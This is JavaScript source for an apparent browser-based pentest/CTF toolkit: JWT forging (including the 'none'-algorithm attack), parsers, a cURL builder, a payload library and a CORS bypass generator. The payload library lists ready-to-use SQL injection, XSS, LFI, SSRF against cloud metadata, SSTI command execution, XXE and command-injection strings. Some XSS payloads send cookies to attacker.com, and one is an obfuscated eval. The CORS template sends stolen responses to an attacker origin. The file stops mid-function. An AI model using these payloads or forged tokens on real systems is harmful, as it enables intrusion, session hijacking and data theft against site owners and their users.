// =========================
// JWT DECODER
// =========================

function buildJwtDecoder(panel){
    panel.innerHTML = `
    ${toolHeader('', 'JWT Decoder', 'Decode and inspect JWT tokens')}
    <div class="tool-wrap">
        <div class="tool-title">JWT Decoder</div>
        <label>JWT Token</label>
        <textarea id="jwtDecInput" placeholder="Paste JWT token here..."></textarea>
        <div class="button-group">
            <button class="btn btn-run" onclick="runJwtDecoder()">Decode</button>
            <button class="btn btn-outline" onclick="clearJwtDecoder()">Clear</button>
        </div>
        ${createOutput('jwtDecOutput', 'Decoded JWT')}
    </div>`;
    autoSaveInput('jwtDecInput', 'jwtDecoder');
}

function runJwtDecoder(){
    const token = document.getElementById('jwtDecInput').value.trim();
    if(!token){ showToast('Paste a JWT token', 'error'); return; }
    try{
        const parts = token.split('.');
        if(parts.length < 2) throw new Error('Invalid JWT');
        const decode = str => {
            str = str.replace(/-/g,'+').replace(/_/g,'/');
            while(str.length % 4) str += '=';
            return JSON.parse(atob(str));
        };
        const header  = decode(parts[0]);
        const payload = decode(parts[1]);
        const sig     = parts[2] || 'N/A';

        // Check expiry
        let expInfo = '';
        if(payload.exp){
            const expDate = new Date(payload.exp * 1000);
            const now     = new Date();
            const expired = expDate < now;
            expInfo = `
            <div style="margin-top:12px; padding:10px;
                        background:${expired ? 'rgba(248,81,73,0.1)' : 'rgba(63,185,80,0.1)'};
                        border-radius:var(--radius-sm); font-size:13px;
                        color:${expired ? 'var(--danger)' : 'var(--success)'};">
                ${expired ? ' Token EXPIRED' : ' Token Valid'} -
                Expires: ${expDate.toLocaleString()}
            </div>`;
        }

        setOutput('jwtDecOutput', `
        <div style="margin-bottom:16px;">
            <div style="color:var(--primary); font-size:12px; margin-bottom:6px; font-family:var(--font);">
                HEADER
            </div>
            <pre style="background:var(--panel-light); padding:12px; border-radius:8px;
                        overflow-x:auto; color:var(--text); font-size:13px;">
${JSON.stringify(header, null, 2)}</pre>
        </div>
        <div style="margin-bottom:16px;">
            <div style="color:var(--primary); font-size:12px; margin-bottom:6px; font-family:var(--font);">
                PAYLOAD
            </div>
            <pre style="background:var(--panel-light); padding:12px; border-radius:8px;
                        overflow-x:auto; color:var(--text); font-size:13px;">
${JSON.stringify(payload, null, 2)}</pre>
        </div>
        <div>
            <div style="color:var(--primary); font-size:12px; margin-bottom:6px; font-family:var(--font);">
                SIGNATURE
            </div>
            <div style="font-family:var(--font-mono); font-size:13px;
                        word-break:break-all; color:var(--muted-light);">
                ${sig}
            </div>
        </div>
        ${expInfo}
        `, true);
    } catch(e){
        setOutput('jwtDecOutput', `Error: ${e.message}`);
        showToast('Invalid JWT', 'error');
    }
}

function clearJwtDecoder(){
    document.getElementById('jwtDecInput').value = '';
    const out = document.getElementById('jwtDecOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

// =========================
// JWT FORGER
// =========================

function buildJwtForger(panel){
    panel.innerHTML = `
    ${toolHeader('', 'JWT Forger', 'Forge JWT tokens with custom payloads and secrets')}
    <div class="tool-wrap">
        <div class="tool-title">JWT Forger</div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab(this,'jwtForgeNew')">Forge New</button>
            <button class="tab-btn"        onclick="switchTab(this,'jwtForgeNone')">None Algorithm</button>
        </div>

        <div class="tab-content active" id="jwtForgeNew">
            <label>Algorithm</label>
            <select id="jwtForgeAlgo">
                <option value="HS256">HS256</option>
                <option value="HS384">HS384</option>
                <option value="HS512">HS512</option>
            </select>
            <label>Payload (JSON)</label>
            <textarea id="jwtForgePayload" style="min-height:100px;"
                placeholder='{"sub":"admin","role":"admin","iat":1234567890}'></textarea>
            <label>Secret Key</label>
            <input type="text" id="jwtForgeSecret" placeholder="Enter secret key...">
            <div class="button-group">
                <button class="btn btn-run" onclick="runJwtForge()">Forge JWT</button>
                <button class="btn btn-outline" onclick="clearJwtForge()">Clear</button>
            </div>
            ${createOutput('jwtForgeOutput', 'Forged JWT')}
        </div>

        <div class="tab-content" id="jwtForgeNone">
            <div class="warn-box">
                 The "none" algorithm attack removes signature verification.
                Some vulnerable servers accept this. For CTF/educational use only.
            </div>
            <label>Original JWT Token</label>
            <textarea id="jwtNoneInput" placeholder="Paste original JWT..."></textarea>
            <label>Modified Payload (JSON) - optional</label>
            <textarea id="jwtNonePayload" placeholder="Leave empty to keep original payload..."
                style="min-height:80px;"></textarea>
            <div class="button-group">
                <button class="btn btn-run" onclick="runJwtNone()">Generate None-Alg JWT</button>
            </div>
            ${createOutput('jwtNoneOutput', 'None-Algorithm JWT')}
        </div>
    </div>`;
}

function b64urlEncode(str){
    return btoa(str).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
}

function runJwtForge(){
    try{
        const algo    = document.getElementById('jwtForgeAlgo').value;
        const secret  = document.getElementById('jwtForgeSecret').value;
        const payStr  = document.getElementById('jwtForgePayload').value;
        if(!payStr){ showToast('Enter payload', 'error'); return; }
        const payload = JSON.parse(payStr);
        const header  = { alg: algo, typ: 'JWT' };
        const h = b64urlEncode(JSON.stringify(header));
        const p = b64urlEncode(JSON.stringify(payload));
        const sigInput = `${h}.${p}`;
        let sig;
        if(algo === 'HS256') sig = CryptoJS.HmacSHA256(sigInput, secret).toString(CryptoJS.enc.Base64)
            .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
        else if(algo === 'HS384') sig = CryptoJS.HmacSHA384(sigInput, secret).toString(CryptoJS.enc.Base64)
            .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
        else sig = CryptoJS.HmacSHA512(sigInput, secret).toString(CryptoJS.enc.Base64)
            .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
        setOutput('jwtForgeOutput', `${h}.${p}.${sig}`);
    } catch(e){
        showToast('Invalid JSON payload', 'error');
    }
}

function clearJwtForge(){
    document.getElementById('jwtForgePayload').value = '';
    document.getElementById('jwtForgeSecret').value  = '';
    const out = document.getElementById('jwtForgeOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

function runJwtNone(){
    try{
        const token = document.getElementById('jwtNoneInput').value.trim();
        if(!token){ showToast('Paste a JWT token', 'error'); return; }
        const parts = token.split('.');
        if(parts.length < 2) throw new Error('Invalid JWT');
        const decode = str => {
            str = str.replace(/-/g,'+').replace(/_/g,'/');
            while(str.length % 4) str += '=';
            return JSON.parse(atob(str));
        };
        const header  = { alg: 'none', typ: 'JWT' };
        const payloadStr = document.getElementById('jwtNonePayload').value.trim();
        const payload = payloadStr ? JSON.parse(payloadStr) : decode(parts[1]);
        const h = b64urlEncode(JSON.stringify(header));
        const p = b64urlEncode(JSON.stringify(payload));
        setOutput('jwtNoneOutput', `${h}.${p}.`);
    } catch(e){
        showToast('Error: ' + e.message, 'error');
    }
}

// =========================
// COOKIE PARSER
// =========================

function buildCookieParser(panel){
    panel.innerHTML = `
    ${toolHeader('', 'Cookie Parser', 'Parse and analyze cookie strings')}
    <div class="tool-wrap">
        <div class="tool-title">Cookie Parser</div>
        <label>Cookie String</label>
        <textarea id="cookieInput"
            placeholder="session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Expires=..."></textarea>
        <div class="button-group">
            <button class="btn btn-run" onclick="runCookieParser()">Parse</button>
            <button class="btn btn-outline" onclick="clearCookieParser()">Clear</button>
        </div>
        ${createOutput('cookieOutput', 'Cookie Analysis')}
    </div>`;
    autoSaveInput('cookieInput', 'cookieParser');
}

function runCookieParser(){
    const cookie = document.getElementById('cookieInput').value.trim();
    if(!cookie){ showToast('Paste a cookie string', 'error'); return; }

    const parts   = cookie.split(';').map(p => p.trim()).filter(Boolean);
    const mainPart = parts[0].split('=');
    const name    = mainPart[0].trim();
    const value   = mainPart.slice(1).join('=').trim();

    const flags = {};
    for(let i = 1; i < parts.length; i++){
        const [k, ...v] = parts[i].split('=');
        flags[k.trim().toLowerCase()] = v.join('=').trim() || true;
    }

    const securityChecks = [
        { name: 'HttpOnly',         present: 'httponly' in flags,
          desc: 'Prevents JavaScript access (XSS protection)',
          good: true },
        { name: 'Secure',           present: 'secure' in flags,
          desc: 'Only sent over HTTPS',
          good: true },
        { name: 'SameSite',         present: 'samesite' in flags,
          desc: `CSRF protection. Value: ${flags['samesite'] || 'Not set'}`,
          good: true },
    ];

    // Try to detect if value is base64 or JWT
    let valueAnalysis = '';
    if(value.split('.').length === 3){
        valueAnalysis = `<div style="color:var(--warning); font-size:12px; margin-top:4px;">
             Value looks like a JWT token</div>`;
    } else if(/^[A-Za-z0-9+/]+=*$/.test(value) && value.length % 4 === 0){
        try{
            const decoded = atob(value);
            valueAnalysis = `<div style="color:var(--primary); font-size:12px; margin-top:4px;">
                 Base64 decoded: ${decoded}</div>`;
        } catch(e){}
    }

    const html = `
    <div style="margin-bottom:16px; padding:12px; background:var(--panel-light);
                border-radius:var(--radius-sm);">
        <div style="color:var(--muted); font-size:12px; margin-bottom:4px;">Cookie Name</div>
        <div style="color:var(--primary); font-weight:700;">${name}</div>
    </div>
    <div style="margin-bottom:16px; padding:12px; background:var(--panel-light);
                border-radius:var(--radius-sm);">
        <div style="color:var(--muted); font-size:12px; margin-bottom:4px;">Value</div>
        <div style="font-family:var(--font-mono); word-break:break-all;">${value}</div>
        ${valueAnalysis}
    </div>
    <div style="margin-bottom:16px;">
        <div style="color:var(--muted); font-size:12px; margin-bottom:8px;">Security Flags</div>
        ${securityChecks.map(c => `
        <div style="display:flex; align-items:center; gap:10px; padding:8px;
                    background:var(--panel-light); border-radius:var(--radius-sm);
                    margin-bottom:6px;">
            <span style="font-size:16px;">${c.present ? '' : ''}</span>
            <div>
                <div style="color:${c.present ? 'var(--success)' : 'var(--danger)'}; font-weight:600;">
                    ${c.name}
                </div>
                <div style="color:var(--muted); font-size:12px;">${c.desc}</div>
            </div>
        </div>`).join('')}
    </div>
    ${Object.keys(flags).length > 0 ? `
    <div>
        <div style="color:var(--muted); font-size:12px; margin-bottom:8px;">All Attributes</div>
        ${Object.entries(flags).map(([k,v]) => `
        <div style="padding:6px 12px; background:var(--panel-light);
                    border-radius:var(--radius-sm); margin-bottom:4px;
                    font-size:13px; font-family:var(--font-mono);">
            <span style="color:var(--primary);">${k}</span>
            ${v !== true ? ` = <span style="color:var(--text);">${v}</span>` : ''}
        </div>`).join('')}
    </div>` : ''}`;

    setOutput('cookieOutput', html, true);
}

function clearCookieParser(){
    document.getElementById('cookieInput').value = '';
    const out = document.getElementById('cookieOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

// =========================
// URL PARSER
// =========================

function buildUrlParser(panel){
    panel.innerHTML = `
    ${toolHeader('', 'URL Parser', 'Dissect URLs into all components')}
    <div class="tool-wrap">
        <div class="tool-title">URL Parser</div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab(this,'urlParse')">Parse URL</button>
            <button class="tab-btn"        onclick="switchTab(this,'urlEncodeDecode')">Encode / Decode</button>
        </div>

        <div class="tab-content active" id="urlParse">
            <label>URL</label>
            <input type="text" id="urlInput"
                placeholder="https://example.com:8080/path?key=value&foo=bar#section">
            <div class="button-group">
                <button class="btn btn-run" onclick="runUrlParser()">Parse</button>
                <button class="btn btn-outline" onclick="clearUrlParser()">Clear</button>
            </div>
            ${createOutput('urlOutput', 'URL Components')}
        </div>

        <div class="tab-content" id="urlEncodeDecode">
            <label>Text</label>
            <textarea id="urlEncInput" placeholder="Enter text to encode or decode..."></textarea>
            <div class="button-group">
                <button class="btn btn-run" onclick="runUrlEncode()">URL Encode</button>
                <button class="btn btn-run" onclick="runUrlDecode()">URL Decode</button>
                <button class="btn btn-run" onclick="runUrlEncodeAll()">Encode All Chars</button>
                <button class="btn btn-outline" onclick="clearUrlEnc()">Clear</button>
            </div>
            ${createOutput('urlEncOutput', 'Output')}
        </div>
    </div>`;
    autoSaveInput('urlInput', 'urlParser');
}

function runUrlParser(){
    const raw = document.getElementById('urlInput').value.trim();
    if(!raw){ showToast('Enter a URL', 'error'); return; }
    try{
        const url = new URL(raw.startsWith('http') ? raw : 'https://' + raw);
        const params = [];
        url.searchParams.forEach((v,k) => params.push({ k, v }));

        const row = (label, value, mono=false) => `
        <div style="display:flex; gap:12px; padding:8px; background:var(--panel-light);
                    border-radius:var(--radius-sm); margin-bottom:4px;">
            <span style="color:var(--muted); min-width:100px; font-size:13px;">${label}</span>
            <span style="color:var(--text); font-family:${mono?'var(--font-mono)':'var(--font)'};
                         word-break:break-all; font-size:13px;">${value || '<span style="color:var(--muted);">none</span>'}</span>
        </div>`;

        const html = `
        ${row('Protocol', url.protocol)}
        ${row('Host',     url.hostname)}
        ${row('Port',     url.port || '(default)')}
        ${row('Path',     url.pathname, true)}
        ${row('Query',    url.search, true)}
        ${row('Hash',     url.hash)}
        ${row('Origin',   url.origin)}
        ${params.length ? `
        <div style="margin-top:12px;">
            <div style="color:var(--muted); font-size:12px; margin-bottom:6px;">
                Query Parameters (${params.length})
            </div>
            ${params.map(p => `
            <div style="display:flex; gap:12px; padding:8px; background:var(--panel-light);
                        border-radius:var(--radius-sm); margin-bottom:4px;">
                <span style="color:var(--primary); min-width:100px; font-family:var(--font-mono);
                             font-size:13px;">${p.k}</span>
                <span style="color:var(--text); font-family:var(--font-mono);
                             word-break:break-all; font-size:13px;">${p.v}</span>
            </div>`).join('')}
        </div>` : ''}`;

        setOutput('urlOutput', html, true);
    } catch(e){
        showToast('Invalid URL', 'error');
    }
}

function clearUrlParser(){
    document.getElementById('urlInput').value = '';
    const out = document.getElementById('urlOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

function runUrlEncode(){ setOutput('urlEncOutput', encodeURIComponent(document.getElementById('urlEncInput').value)); }
function runUrlDecode(){ try{ setOutput('urlEncOutput', decodeURIComponent(document.getElementById('urlEncInput').value)); } catch(e){ showToast('Invalid URL encoding','error'); }}
function runUrlEncodeAll(){
    const text = document.getElementById('urlEncInput').value;
    const result = Array.from(text).map(c => '%'+c.charCodeAt(0).toString(16).padStart(2,'0').toUpperCase()).join('');
    setOutput('urlEncOutput', result);
}
function clearUrlEnc(){
    document.getElementById('urlEncInput').value = '';
    const out = document.getElementById('urlEncOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

// =========================
// HEADER PARSER
// =========================

function buildHeaderParser(panel){
    panel.innerHTML = `
    ${toolHeader('', 'Header Parser', 'Parse and analyze HTTP request/response headers')}
    <div class="tool-wrap">
        <div class="tool-title">Header Parser</div>
        <label>Paste HTTP Headers</label>
        <textarea id="headerInput" style="min-height:160px;"
            placeholder="HTTP/1.1 200 OK\nContent-Type: application/json\nX-Frame-Options: DENY\n..."></textarea>
        <div class="button-group">
            <button class="btn btn-run" onclick="runHeaderParser()">Parse &amp; Analyze</button>
            <button class="btn btn-outline" onclick="clearHeaderParser()">Clear</button>
        </div>
        ${createOutput('headerOutput', 'Header Analysis')}
    </div>`;
    autoSaveInput('headerInput', 'headerParser');
}

function runHeaderParser(){
    const input = document.getElementById('headerInput').value.trim();
    if(!input){ showToast('Paste headers first', 'error'); return; }

    const lines   = input.split('\n').filter(l => l.trim());
    const headers = {};
    let statusLine = '';

    lines.forEach(line => {
        if(line.match(/^HTTP\//)){
            statusLine = line;
            return;
        }
        const idx = line.indexOf(':');
        if(idx > 0){
            const key = line.slice(0, idx).trim();
            const val = line.slice(idx+1).trim();
            headers[key.toLowerCase()] = { original: key, value: val };
        }
    });

    // Security header checks
    const securityHeaders = [
        { key: 'x-frame-options',           name: 'X-Frame-Options',           desc: 'Clickjacking protection' },
        { key: 'x-content-type-options',     name: 'X-Content-Type-Options',    desc: 'MIME sniffing protection' },
        { key: 'strict-transport-security',  name: 'HSTS',                      desc: 'Forces HTTPS' },
        { key: 'content-security-policy',    name: 'CSP',                       desc: 'XSS and injection protection' },
        { key: 'x-xss-protection',           name: 'X-XSS-Protection',          desc: 'Browser XSS filter' },
        { key: 'referrer-policy',            name: 'Referrer-Policy',           desc: 'Controls referrer information' },
        { key: 'permissions-policy',         name: 'Permissions-Policy',        desc: 'Browser feature control' },
    ];

    const html = `
    ${statusLine ? `
    <div style="padding:10px; background:var(--panel-light); border-radius:var(--radius-sm);
                margin-bottom:16px; font-family:var(--font-mono); color:var(--primary);">
        ${statusLine}
    </div>` : ''}

    <div style="margin-bottom:16px;">
        <div style="color:var(--muted); font-size:12px; margin-bottom:8px;">
            ALL HEADERS (${Object.keys(headers).length})
        </div>
        ${Object.values(headers).map(h => `
        <div style="display:flex; gap:8px; padding:7px; background:var(--panel-light);
                    border-radius:var(--radius-sm); margin-bottom:3px; font-size:13px;">
            <span style="color:var(--primary); min-width:200px; font-family:var(--font-mono);">
                ${h.original}
            </span>
            <span style="color:var(--text); word-break:break-word;">${h.value}</span>
        </div>`).join('')}
    </div>

    <div>
        <div style="color:var(--muted); font-size:12px; margin-bottom:8px;">SECURITY ANALYSIS</div>
        ${securityHeaders.map(s => {
            const present = s.key in headers;
            return `
            <div style="display:flex; align-items:flex-start; gap:10px; padding:8px;
                        background:var(--panel-light); border-radius:var(--radius-sm);
                        margin-bottom:4px;">
                <span>${present ? '' : ''}</span>
                <div>
                    <div style="color:${present ? 'var(--success)' : 'var(--danger)'}; font-weight:600;">
                        ${s.name}
                    </div>
                    <div style="color:var(--muted); font-size:12px;">${s.desc}</div>
                    ${present ? `<div style="color:var(--text); font-size:12px; font-family:var(--font-mono);
                        margin-top:2px;">${headers[s.key].value}</div>` : ''}
                </div>
            </div>`;
        }).join('')}
    </div>`;

    setOutput('headerOutput', html, true);
}

function clearHeaderParser(){
    document.getElementById('headerInput').value = '';
    const out = document.getElementById('headerOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

// =========================
// HTML ENCODER / DECODER
// =========================

function buildHtmlEncoderDecoder(panel){
    panel.innerHTML = `
    ${toolHeader('', 'HTML Encoder / Decoder', 'Encode and decode HTML entities')}
    <div class="tool-wrap">
        <div class="tool-title">HTML Encoder / Decoder</div>
        <label>Input</label>
        <textarea id="htmlEncInput" placeholder="Enter text or HTML..."></textarea>
        <div class="button-group">
            <button class="btn btn-run" onclick="runHtmlEncode()">Encode</button>
            <button class="btn btn-run" onclick="runHtmlDecode()">Decode</button>
            <button class="btn btn-run" onclick="runHtmlEncodeAll()">Encode All (&#xx;)</button>
            <button class="btn btn-outline" onclick="clearHtmlEnc()">Clear</button>
        </div>
        ${createOutput('htmlEncOutput', 'Output')}
    </div>`;
    autoSaveInput('htmlEncInput', 'htmlEncoderDecoder');
}

function runHtmlEncode(){
    const text = document.getElementById('htmlEncInput').value;
    const result = text
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
        .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
    setOutput('htmlEncOutput', result);
}

function runHtmlDecode(){
    const d = document.createElement('div');
    d.innerHTML = document.getElementById('htmlEncInput').value;
    setOutput('htmlEncOutput', d.textContent);
}

function runHtmlEncodeAll(){
    const text   = document.getElementById('htmlEncInput').value;
    const result = Array.from(text).map(c => `&#${c.charCodeAt(0)};`).join('');
    setOutput('htmlEncOutput', result);
}

function clearHtmlEnc(){
    document.getElementById('htmlEncInput').value = '';
    const out = document.getElementById('htmlEncOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

// =========================
// PAYLOAD LIBRARY
// =========================

function buildPayloadLibrary(panel){
    panel.innerHTML = `
    ${toolHeader('', 'Payload Library', 'Common CTF and pentest payloads')}
    <div class="tool-wrap">
        <div class="tool-title">Payload Library</div>
        <label>Category</label>
        <select id="payloadCat" onchange="loadPayloads()">
            <option value="sqli">SQL Injection (SQLi)</option>
            <option value="xss">Cross-Site Scripting (XSS)</option>
            <option value="lfi">Local File Inclusion (LFI)</option>
            <option value="ssrf">Server-Side Request Forgery (SSRF)</option>
            <option value="ssti">Server-Side Template Injection (SSTI)</option>
            <option value="xxe">XML External Entity (XXE)</option>
            <option value="rce">Remote Code Execution (RCE)</option>
            <option value="open_redirect">Open Redirect</option>
        </select>
        ${createOutput('payloadOutput', 'Payloads')}
    </div>`;
    setTimeout(loadPayloads, 100);
}

function loadPayloads(){
    const type = document.getElementById('payloadCat').value;
    const payloads = {
        sqli: `' OR 1=1 --
' OR '1'='1
" OR "1"="1
' OR 1=1#
' OR 1=1/*
admin'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
'; DROP TABLE users;--
1; SELECT * FROM information_schema.tables--
' AND 1=0 UNION SELECT table_name FROM information_schema.tables--
' AND SLEEP(5)--
' AND 1=1 AND SLEEP(5)--
1' WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,

        xss: `<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</option></select>
javascript:alert(1)
<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>document.location='http://attacker.com/?c='+document.cookie</script>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>`,

        lfi: `../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/nginx/access.log
../../../windows/win.ini
..\\..\\..\\windows\\win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`,

        ssrf: `http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
file:///etc/passwd
dict://127.0.0.1:11211/stat
gopher://127.0.0.1:25/HELO`,

        ssti: `{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.class.mro()[1].subclasses()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
#{7*7}
*{7*7}
@(7*7)`,

        xxe: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Read file -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<data>&xxe;</data>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

<!-- Blind XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo></foo>`,

        rce: `; id
| id
|| id
& id
&& id
\`id\`
$(id)
; cat /etc/passwd
| cat /etc/passwd
; ls -la
; whoami
; uname -a
; cat /proc/version
%0a id
%0d%0a id
%0acat%20/etc/passwd
127.0.0.1; cat /etc/passwd
127.0.0.1 | cat /etc/passwd`,

        open_redirect: `/redirect?url=https://evil.com
/redirect?next=https://evil.com
/redirect?to=https://evil.com
/redirect?goto=https://evil.com
/redirect?return=https://evil.com
//evil.com
///evil.com
////evil.com
https:evil.com
https://evil.com@legit.com
https://legit.com.evil.com
javascript:alert(document.domain)`,
    };

    setOutput('payloadOutput', payloads[type] || 'No payloads for this category');
}

// =========================
// CURL BUILDER
// =========================

function buildCurlBuilder(panel){
    panel.innerHTML = `
    ${toolHeader('', 'cURL Builder', 'Build cURL commands visually')}
    <div class="tool-wrap">
        <div class="tool-title">cURL Builder</div>
        <label>URL</label>
        <input type="text" id="curlUrl" placeholder="https://example.com/api/endpoint">
        <label>Method</label>
        <select id="curlMethod">
            <option>GET</option><option>POST</option><option>PUT</option>
            <option>DELETE</option><option>PATCH</option><option>HEAD</option><option>OPTIONS</option>
        </select>
        <label>Headers (one per line: Key: Value)</label>
        <textarea id="curlHeaders" style="min-height:80px;"
            placeholder="Content-Type: application/json&#10;Authorization: Bearer token123"></textarea>
        <label>Request Body</label>
        <textarea id="curlBody" style="min-height:80px;"
            placeholder='{"key":"value"}'></textarea>
        <label>Options</label>
        <div style="display:flex; gap:16px; flex-wrap:wrap; margin-bottom:12px; font-size:14px;">
            <label style="display:flex; align-items:center; gap:6px; margin:0; color:var(--muted-light);">
                <input type="checkbox" id="curlInsecure"> -k (insecure)
            </label>
            <label style="display:flex; align-items:center; gap:6px; margin:0; color:var(--muted-light);">
                <input type="checkbox" id="curlVerbose"> -v (verbose)
            </label>
            <label style="display:flex; align-items:center; gap:6px; margin:0; color:var(--muted-light);">
                <input type="checkbox" id="curlFollow"> -L (follow redirects)
            </label>
            <label style="display:flex; align-items:center; gap:6px; margin:0; color:var(--muted-light);">
                <input type="checkbox" id="curlSilent"> -s (silent)
            </label>
        </div>
        <div class="button-group">
            <button class="btn btn-run" onclick="runCurlBuilder()">Build cURL</button>
            <button class="btn btn-outline" onclick="clearCurlBuilder()">Clear</button>
        </div>
        ${createOutput('curlOutput', 'cURL Command')}
    </div>`;
}

function runCurlBuilder(){
    const url     = document.getElementById('curlUrl').value.trim();
    const method  = document.getElementById('curlMethod').value;
    const headers = document.getElementById('curlHeaders').value.split('\n').filter(l => l.trim());
    const body    = document.getElementById('curlBody').value.trim();
    const insecure = document.getElementById('curlInsecure').checked;
    const verbose  = document.getElementById('curlVerbose').checked;
    const follow   = document.getElementById('curlFollow').checked;
    const silent   = document.getElementById('curlSilent').checked;

    if(!url){ showToast('Enter a URL', 'error'); return; }

    let curl = `curl -X ${method}`;
    if(insecure) curl += ` -k`;
    if(verbose)  curl += ` -v`;
    if(follow)   curl += ` -L`;
    if(silent)   curl += ` -s`;
    headers.forEach(h => { curl += ` \\\n  -H "${h.trim()}"`; });
    if(body) curl += ` \\\n  -d '${body}'`;
    curl += ` \\\n  "${url}"`;

    setOutput('curlOutput', curl);
}

function clearCurlBuilder(){
    ['curlUrl','curlHeaders','curlBody'].forEach(id => {
        const el = document.getElementById(id);
        if(el) el.value = '';
    });
    const out = document.getElementById('curlOutput');
    if(out) out.innerHTML = '<span style="color:var(--muted)">Result will appear here...</span>';
}

// =========================
// CORS BYPASS GENERATOR
// =========================

function buildCorsGenerator(panel){
    panel.innerHTML = `
    ${toolHeader('', 'CORS Bypass Generator', 'Generate CORS bypass payloads and test vectors')}
    <div class="tool-wrap">
        <div class="tool-title">CORS Bypass Generator</div>
        <label>Target Origin</label>
        <input type="text" id="corsTarget" placeholder="https://target.com">
        <label>Attacker Origin</label>
        <input type="text" id="corsAttacker" placeholder="https://attacker.com">
        <div class="button-group">
            <button class="btn btn-run" onclick="runCorsGenerator()">Generate Payloads</button>
            <button class="btn btn-outline" onclick="clearCors()">Clear</button>
        </div>
        ${createOutput('corsOutput', 'CORS Bypass Vectors')}
    </div>
    <div class="tool-wrap">
        <div class="tool-title">CORS Bypass Techniques Reference</div>
        ${[
            ['Null Origin', 'Origin: null', 'Some servers accidentally allow sandboxed or null origins.'],
            ['Subdomain Wildcard', 'Origin: https://evil.target.com', 'Useful when validation only checks for a suffix.'],
            ['Pre-domain Match', 'Origin: https://target.com.evil.com', 'Useful when validation only checks for a prefix.'],
            ['Case Variation', 'Origin: HTTPS://TARGET.COM', 'Tests brittle case-sensitive validation.'],
            ['Trusted Subdomain XSS', 'XSS on trusted.target.com', 'A trusted vulnerable subdomain can inherit allowed origin trust.'],
        ].map(([name, example, desc]) => `
        <div style="padding:10px; background:var(--panel-light); border-radius:var(--radius-sm); margin-bottom:6px;">
            <div style="color:var(--primary); font-weight:700; margin-bottom:4px;">${escapeHtml(name)}</div>
            <code style="display:block; color:var(--text); font-size:12px; margin-bottom:4px;">${escapeHtml(example)}</code>
            <div style="color:var(--muted); font-size:12px;">${escapeHtml(desc)}</div>
        </div>`).join('')}
    </div>`;
}

function runCorsGenerator(){
    const target = document.getElementById('corsTarget').value.trim() || 'https://target.com';
    const attacker = document.getElementById('corsAttacker').value.trim() || 'https://attacker.com';
    const domain = target.replace(/^https?:\/\//i, '').replace(/\/.*/, '');
    const attackerDomain = attacker.replace(/^https?:\/\//i, '').replace(/\/.*/, '');

    const vectors = [
        'Origin: null',
        `Origin: ${attacker}`,
        `Origin: https://${domain}.${attackerDomain}`,
        `Origin: https://${attackerDomain}.${domain}`,
        `Origin: https://evil.${domain}`,
        `Origin: ${target}%60`,
        `Origin: ${target}!`,
        `Origin: ${target}.evil.com`,
        `Origin: HTTPS://${domain.toUpperCase()}`,
        `Origin: http://${domain}`,
    ];

    const exploit = `// Educational CORS test template
fetch('${target}/api/sensitive', {
  credentials: 'include'
})
  .then(response => response.text())
  .then(data => {
    return fetch('${attacker}/collect?data=' + encodeURIComponent(btoa(data)));
  });`;

